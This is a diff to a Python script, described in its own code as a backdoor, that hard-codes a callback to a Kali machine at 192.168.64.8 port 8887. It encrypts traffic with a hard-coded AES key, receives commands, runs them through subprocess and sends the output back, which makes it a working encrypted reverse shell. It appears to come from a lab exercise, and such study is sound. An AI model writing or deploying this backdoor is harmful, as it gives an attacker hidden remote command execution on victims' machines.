@@ -11,10 +11,8 @@ import base64
 from Crypto.Cipher import AES
 
 
-# Step 1: Use explicite SERVER_IP and SERVER_PORT make create a connection 
-# SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
-# SERVER_PORT = 8888
 
+'''
 # Step 3: Configuration
 parser = argparse.ArgumentParser(description='Backdoor script to connect to given IP and port.')
 parser.add_argument('ip', help='IP address to connect to')
@@ -24,9 +22,16 @@ args = parser.parse_args()
 
 SERVER_IP = args.ip
 SERVER_PORT = args.port
+'''
+
+# Step 1: Use explicit SERVER_IP and SERVER_PORT make create a connection 
+SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
+SERVER_PORT = 8887
 
 #Step 4: Authentication
 key = b'\x91)\xdd\xa9\x06\xaa\x8d\xb2\xbd\x7fY\x84! \x99\xcb'
+
+
 def encrypt(msg):
   cipher = AES.new(key, AES.MODE_EAX)
   nonce = cipher.nonce
@@ -42,9 +47,10 @@ def decrypt(nonce, ciphertext, tag):
   except:
     return False
 
-def send_encrypted(data):
+
+def send(data):
     nonce, ciphertext, tag = encrypt(data)
-     message = {
+    message = {
         'nonce': base64.b64encode(nonce).decode('utf-8'),
         'ciphertext': base64.b64encode(ciphertext).decode('utf-8'),
         'tag': base64.b64encode(tag).decode('utf-8')
@@ -60,6 +66,7 @@ def recv_command():
         nonce = base64.b64decode(message['nonce'])
         ciphertext = base64.b64decode(message['ciphertext'])
         tag = base64.b64decode(message['tag'])
+        decrypted_command = decrypt(nonce, ciphertext, tag)
         if decrypted_command is False:
             print("Decryption failed.")
             return None
@@ -94,7 +101,7 @@ def work():
                                        stdin=subprocess.PIPE)
             output = execute.stdout.read() + execute.stderr.read()
             output = output.decode()
-            send_encrypted(output)
+            send(output)
 
 
 client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
